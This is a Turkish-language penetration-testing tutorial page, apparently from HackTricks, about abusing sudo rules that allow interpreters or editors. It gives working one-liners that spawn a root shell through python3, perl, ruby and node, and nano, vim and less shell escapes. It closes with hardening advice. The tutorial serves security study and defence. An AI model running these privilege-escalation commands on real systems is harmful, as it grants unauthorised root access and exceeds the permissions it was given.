# Sudo Komut Kötüye Kullanımı

{{#include ../../banners/hacktricks-training.md}}

## Sudo ile çalıştırılmasına izin verilen yorumlayıcılar

`sudo -l`, bir kullanıcının bir yorumlayıcıyı root olarak çalıştırmasına izin veriyorsa bunu doğrudan code execution olarak değerlendirin. Yorumlayıcılar arbitrary code çalıştırmak üzere tasarlanmıştır; bu nedenle `python3`, `perl`, `ruby`, `lua`, `node` veya benzer binary'lerin çalıştırılmasına izin veren bir kural, argümanlar sıkı şekilde sınırlandırılıp doğrulanmadığı sürece genellikle root command execution ile eşdeğerdir.

Yaygın inceleme akışı:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Diğer interpreter örnekleri:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tam yol önemlidir. sudo kuralı `/usr/bin/python3` kullanımına izin veriyorsa doğrulama sırasında tam olarak bu yolu kullanın:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo izinli editörler

`sudo -l`, bir kullanıcının root olarak etkileşimli bir editör çalıştırmasına izin veriyorsa bunu zararsız bir dosya düzenleme yetkisi olarak değil, command-execution yüzeyi olarak değerlendirin. Editörler çoğu zaman shell komutlarını çalıştırabilir, rastgele dosyaları okuyabilir, rastgele dosyalara yazabilir veya editör içinden harici yardımcıları çağırabilir.

Yaygın inceleme akışı:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano komut çalıştırma

`nano` kullanımına sudo üzerinden izin verildiğinde, komut çalıştırmaya editör arayüzünden erişilebilir:
```text
Ctrl+R
Ctrl+X
```
Ardından şu komut gibi bir komut sağlayın:
```bash
id
/bin/sh
```
Bazı terminallerde, etkileşimli bir shell için standart akışların yeniden yönlendirilmesi gerekebilir:
```bash
reset; /bin/sh 1>&0 2>&0
```
Kesin tuş dizisi nano sürümüne ve derleme seçeneklerine göre değişebilir, ancak security issue aynıdır: editor root olarak çalışır ve external commands çalıştırabilir.

### Diğer yaygın editor escapes

Vim-style editors genellikle `:!` aracılığıyla command execution özelliği sunar:
```text
:!/bin/sh
```
`less` gibi pager'lar shell çalıştırmayı da mümkün kılabilir:
```text
!/bin/sh
```
## Savunma notları

- sudo üzerinden interpreter veya interactive editor yetkisi vermekten kaçının.
- Tek ve dar kapsamlı bir yönetim işlemi gerçekleştiren, root-owned sabit wrapper'ları tercih edin.
- Bir interpreter kaçınılmazsa tam script path'ini kısıtlayın; kullanıcı kontrollü argümanları, yazılabilir import'ları, `PYTHONPATH`'i ve güvenli olmayan environment korumasını engelleyin.
- Dosya düzenleme gerekiyorsa tam file path'ini kısıtlayın ve patched sudo sürümleri ile strict environment handling kullanarak `sudoedit`'i değerlendirin.
- `SETENV`, `env_keep`, yazılabilir working directory'leri, yazılabilir module/import path'lerini, `NOEXEC`, `use_pty` ve logging'i inceleyin; ancak bunları eksiksiz bir sandbox olarak değerlendirmeyin.
{{#include ../../banners/hacktricks-training.md}}
